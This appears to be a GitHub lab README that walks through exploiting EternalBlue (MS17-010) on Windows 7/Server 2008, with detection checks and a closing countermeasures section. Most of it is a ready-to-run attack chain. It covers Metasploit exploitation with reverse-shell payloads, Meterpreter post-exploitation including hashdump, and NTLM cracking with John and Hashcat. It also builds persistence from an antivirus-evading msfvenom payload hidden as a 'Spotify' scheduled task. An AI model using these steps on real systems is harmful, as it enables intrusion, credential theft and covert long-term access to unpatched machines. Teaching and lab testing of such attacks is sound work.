# MS17-010-Exploit-Lab

## DISCLAIMER!!!

This repository is a step-by-step guide intended for educational and ethical penetration testing purposes only, to inform and demonstrate how to execute the EternalBlue (MS17-010) vulnerability on Windows 7/Windows 2008 Server, and how to secure said machines.

⚠️ **DO NOT ATTEMPT TO REPRODUCE THIS EXPLOIT ON ANY SYSTEM THAT YOU DO NOT OWN OR HAVE PERMISSION TO TEST ON. UNAUTHORIZED USE OF THE SHOWN TECHNIQUES IS ILLEGAL.**

Under **18 U.S. Code § 1030 – Fraud and related activity in connection with computers** (Computer Fraud and Abuse Act), unauthorized access to computer systems is a federal offense punishable by **fines and imprisonment**.

---

# Prerequisites

Minimum System Requirements:  
* 4-8 GB RAM  
* 2-4 Cores  
* 30 GB Storage  

> VMware installed on WINDOWS  
Kali Linux, Install the prebuilt VMware VM from the offical website: **https://www.kali.org/get-kali/#kali-virtual-machines**  
Vulnerable Windows system. Link to my Windows Server 2008 VM : **https://drive.google.com/drive/u/0/folders/19ua9-TqJHEouytTjlxl2iCUYewcjLzVN password: MS17-010-Exploit-Lab**


---

# About EternalBlue (MS17-010)

EternalBlue (MS17-010) is a severe vulnerability that exploits a buffer overflow flaw in Microsoft's Server Message Block (SMBv1) protocol, allowing attackers to gain access to the victim, and perform remote code execution on unpatched systems. It was developed and used by the U.S. National Security Agency (NSA), and later leaked by the Shadow Brokers hacking group. The EternalBlue exploit was notoriously used by the WannaCry hacking group. WannaCry would exploit a victim via EternalBlue, then upload their Ransomware worm, automatically spreading and infecting other devices on the network.

---

# Checking for MS17-010

***Windows:***    

Eternalblue exploits the SMBv1 protocol, we could check its status to see whether the system may be vulnerable. We could do this using this powershell command:  
``` powershell
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
Get-ItemProperty -Path $regPath -Name SMB1

```
the output should look like of the following
``` powershell
SMB1         : 1
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Pa
               rameters
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer
PSChildName  : Parameters
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
if SMBv1 is set to 0, SMBv1 is **disabled** and the system is **not vulnerable.**
if its set to 1, SMBv1 is **Enabled** and the system could be at risk if unpatched. To Definitively check the systems vulnerability you could run the following command to check if the EternalBlue patch is installed.   

Using cmd or powershell run:
``` powershell
wmic qfe get HotFixID | findstr KB4012212
```
If nothing is returned the patch is not installed and the system is at risk of being vulnerable. **if SMBv1 is enabled the system is vulnerable.**        

---

***Linux:***  
There are a few ways to check if a Windows system is vulnerable using Linux. The first method I'll demonstrate is by using the nmap command. You can use the **--script=vuln** option to run a collection of vulnerability scanning scripts from the Nmap library, which attempts to find all possible vulnerabilities the target might have. You could also use the "--script=smb*" option to run all of Nmap’s SMB related scripts, or the **--script=smb-vuln-ms17-010** option, which scans for the EternalBlue vulnerability exclusively and is the fastest. For our example, we’ll be using this last one.  
Using a shell input the following:
``` bash
nmap -sS -T4 XXX.XXX.XXX.XXX --script=smb-vuln-ms17-010
# -sS = optional, does not complete the full 3 way handshake, dropping the connection once we recieve the syn/ack flag
# -T4 = optional, increases scan speed by reducing probe delay, sending pings faster (250ms between) to make the scan quicker.
# XXX.XXX.XXX.XXX = system that will be scanned.
# --script=smb-vuln-ms17-010 = nmaps script to scan whether the machine is vulnerable to EternalBlue (MS17-010). 
```  
if vulnerable the output will look similar to the image below, with the smb-vuln-ms17-010 script stating the device is **VULNERABLE**, giving the Microsoft security code regarding the vulnerability, [MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
 and the associated CVE identifier, [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143).


![image](https://github.com/user-attachments/assets/a0aab1fc-0025-431f-a069-3d820c3457c0)  

The second method for checking if a system is vulnerable to the EternalBlue (MS17-010) exploit is by using Metasploit Framework's MS17-010 auxiliary module. Here is the process for scanning:

``` bash
msfconsole
# Launches the Metasploit Framework

msf6 > use auxiliary/scanner/smb/smb_ms17_010
## sets the auxilary scanning module we will use to check MS17-010 vulnerability status

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS XXX.XXX.XXX.XXX
# Sets the Remote Host (system we are scanning)

msf6 auxiliary(scanner/smb/smb_ms17_010) > Show options
# shows options we've set for our module/payload, verify before running it.

msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
```  

 Once run, if the machine is vulnerable, the output would look like:  

![image](https://github.com/user-attachments/assets/bc32b8af-8e92-4d84-b7a2-d7559a96d794)

---

# Exploitation

Now that we know that the system is vulnerable, we could exploit it using the following commands:
``` bash
msfconsole

msf6 > use exploit/windows/smb/ms17_010_eternalblue
# or use the module below, either could work. If you're having issues with one, try the other
msf > use exploit/windows/smb/ms17_010_psexec

msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
# You could set a variety of different payloads, in this example I will be using a reverse TCP Meterpreter payload.
# The EternalBlue exploit only works with x64 payloads. To check the available payloads, you could run [show payloads]
# Recommended payloads:
# /windows/x64/meterpreter/bind_tcp (Meterpreter shell, attacker creates listener, victim connects)
# /windows/x64/meterpreter/reverse_tcp (Meterpreter shell, victim creates listener, attacker connects)
# /windows/x64/meterpreter/reverse_http (Meterpreter shell, victim connects over HTTP, attacker listens [more stealthy])
# /windows/x64/shell/bind_tcp (cmd.exe shell, attacker creates listner, victim connects)
# /windows/x64/shell/reverse_tcp (cmd.exe shell, victim creates listener, attacker connects)

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set RHOSTS XXX.XXX.XXX.XXX

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set RPORT 445
# RPORT = SMB's vulnerable port, not necessary as the exploit specifies 445 by default. Change only if port forwarding.

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set LHOST XXX.XXX.XXX.XXX
# LHOST = Local HOST, your attacking machine's IP

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set LPORT 1337
# LPORT = Local PORT, used only for reverse payloads. Can be set to any ephemeral high port (1000–65535)

msf6 exploit(windows/smb/ms17_010_eternalblue) > Show Options

msf6 exploit(windows/smb/ms17_010_eternalblue) > Exploit
```  
If the exploit is successful, the output should look like the image below, and you will have access to a shell. **If you've failed to generate a shell, restart and try again.** The exploit can cause lsass.exe to crash, which can result in the machine becoming unstable and the exploit fail.

![image](https://github.com/user-attachments/assets/12d1fb14-cbd2-4b4a-b006-7ab892ac3a80)

---

# Post-Exploitation

once we have access to the machine, and preferably have a Meterpreter shell open, we can perform post exploitation. Meterpreter is a powerful shell that provides a versatile  set of tools not available through CMD or Powershell. Below are some useful meterpreter commands to get started.

``` Meterpreter
meterpreter > sysinfo
# Provides similar output to CMD's systeminfo command

meterpreter > ipconfig
meterpreter > ifconfig
# Provides networking information on the victim

meterpreter > getuid
# Displays the user your Meterpreter shell is running as

meterpreter > ps
# Shows all running processes

meterpreter > migrate <pid>
# Migrates the Meterpreter shell to a different process. Can be used for privilege escalation or stability

meterpreter > getsystem
# Attempts to elevate your Meterpreter shell to NT AUTHORITY\SYSTEM using built-in techniques

meterpreter > hashdump
# Extracts user accounts and their associated password hashes from the SAM database; hashes can be cracked using John or Hashcat

meterpreter > upload "/home/attacker/file.ps1" "C:\Windows\Victim\file.ps1"
# Uploads a file from the attacker's machine to the victim

meterpreter > download "C:\Windows\Victim\filetodownload.txt" "/home/attacker/downloaded.txt"
# Downloads a file from the victim machine to the attacker's machine

meterpreter > execute -f "C:\\Users\\Public\\virus.exe"
# Executes the specified file

meterpreter > shell
# Launches a CMD shell on a Windows victim or a Bash shell on a Linux victim
```

---

# Cracking NT Hashes with John and Hashcat from Hashdump
Hashdump extracts user credentials and their associated hashes from the SAM Database. You can only have access to the SAM Database with NT SYSTEM level privileges. Windows's default password encoding scheme is NTLM (NT Lan Manager). Once we have the users hashes from Meterpreters hashdump command, we could use these hashes, along with John, or Hashcat to crack them, giving us the system credentials. With credentials, we could possibly log in remotely if the system has a SSH Server (unlikely for windows as its not a feature natively) Remote Desktop Protocol (RDP) or winRM (Windows Remote Management) via Powershell Remoting. We could also potentially use these credentials else where if the user has bad security practices and reuses his passwords.    

**John:**  
```bash
echo "hashdumpoutput" > creds.txt
john --format=NT creds.txt
```  
**Hashcat:**
```bash
echo "hashdumpoutput" > creds.txt

sudo gunzip /usr/share/wordlists/rockyou.txt.gz
# By default kali has the rockyou.txt password dictionary, but its archived in gzip

hashcat -m 1000 -a 0 text.txt /usr/share/wordlists/rockyou.txt
# Dictionary attack

hashcat -m 1000 -a 3 text.txt ?a?a?a?a?a?a?a?a
# Brute-force attack
```

> Realistically, password cracking takes a long time, especially if the credentials are complex or arent in the wordlist you're using. If you want to do this step without waiting hours/days on end I would add the credentials from the creds.txt file in the repository to the wordlist you are using.

---

# Persistence

At this point the system is basically ours, with the exception of the event the owner patches the vulnerability. To counteract this, we will set up a persistence mechanism. Using the Metasploit Framework's MSFVenom tool, we will create a custom payload and upload it to the machine, making it run at startup.

Here's a step-by-step guide on how to implement this:

``` bash
## msfvenom options
# -p = selects the payload you want to use.
# -e = encoding, obfuscates the payload to avoid antivirus/firewall detection.
# -i = sets the amount of iterations your payload will be encoded
# -f = sets the file type
# LHOST = attackers ip
# LPORT = RHP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=XXX.XXX.XXX.XXX LPORT=5386 -e x64/shikata_ga_nai -i 10 -f exe > payload.exe

# Back in your meterpreter shell
meterpreter > upload ./payload.exe "C:\windows\system32\payload.exe"

meterpreter > execute -f "C:\windows\system32\payload.exe"

meterpreter > shell

C:\Windows\System32> SCHTASKS /Create /SC ONSTART /TN "Spotify" /TR "C:\windows\system32\payload.exe" /RU SYSTEM
# Creates a windows scheduled task named "Spotify" that launches our payload on system startup.
```  
Now that we've uploaded our payload let's see if our backdoor works

``` bash
C:\Windows\System32> background
# From our Meterpreter CMD shell
# the background command allows you to close the shell, bringing you back to metasploit while keeping the shell open in the background

msf6 exploit(windows/smb/ms17_010_eternalblue) > use multi/handler
# The multi/handler module handles incoming connections from payloads we've deployed on a target machine.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
# Use the same payload as the one you've chosen for your msfvenom payload

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST XXX.XXX.XXX.XXX
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 5386
# Use the same options you've used when you created the msfvenom payload

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
Once you've got a Meterpreter shell, restart the machine and execute it again to verify whether we've successfully established persistence.

---

# Countermeasures for EternalBlue

To prevent this exploit from occurring on your Windows 7/Windows 2008 Server system, you can update to the latest security patches. Although these operating systems are no longer supported, before they were discontinued, Microsoft released the security patch KB4012212, which could prevent these attacks from happening. If updating to the latest patches and upgrading to a newer version of Windows is not viable, you could disable SMBv1 and use SMBv2, as EternalBlue (MS17-010) only exploits SMBv1. While this patches EternalBlue, SMBv2 has an exploit of its own, [MS08-067](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) that also allows you to execute Remote Code Execution. To avoid this altogether, I would recommend outright disabling the SMB protocol. Another precaution you could take is to enable Windows Defender or an up-to-date antivirus program to protect against payload execution on the machine and ensure your firewall is active. If necessary, block inbound SMB traffic. Here are some commands you could perform to strengthen against this attack.

``` powershell
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB1 -Value 0 -Force
# Disable SMBv1 via registry

Get-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB1
# Check SMBv1 status (0 = disabled, 1 = enabled)

Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB2 -Value 1 -Force
# Enable SMBv2 protocol (not recommended)

Get-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB2
# Check SMBv2 status (0 = disabled, 1 = enabled)

# Disable SMBv1 and SMBv2 for best security


Set-MpPreference -DisableRealtimeMonitoring $false
# Enable Windows Defender Antivirus

Update-MpSignature
# Update Windows Defender definitions

netsh advfirewall set allprofiles state on
# Turns on the Windows Firewall for Domain, Private, and Public profiles

netsh advfirewall firewall add rule name="Block SMB 445" dir=in action=block protocol=TCP localport=445
# Block SMB inbound traffic on the firewall
```

---

# CTFs
wip

---

# Legal & Ethical Use Reminder

Once again, Metasploit Framework is free and open-source software under the **[BSD-3-Clause License](https://github.com/rapid7/metasploit-model/blob/master/LICENSE)**, which allows redistribution and modification. But, as stated in Rapid7's Terms of Service, Metasploit is only authorized for use in environments you have permission to use.  

**⚠️ Metasploit should not be used to exploit any system without permission, and doing so is unethical and/or illegal. Unauthorized exploitation could violate the Computer Fraud and Abuse Act (CFAA), or similar in your jurisdiction, and could result in criminal action.**

Please always receive written consent before testing systems. This lab is for educational and legal research purposes only.
If configured correctly, you would now have a Meterpreter shell. You can check if your persistence works by rebooting the system and trying again.
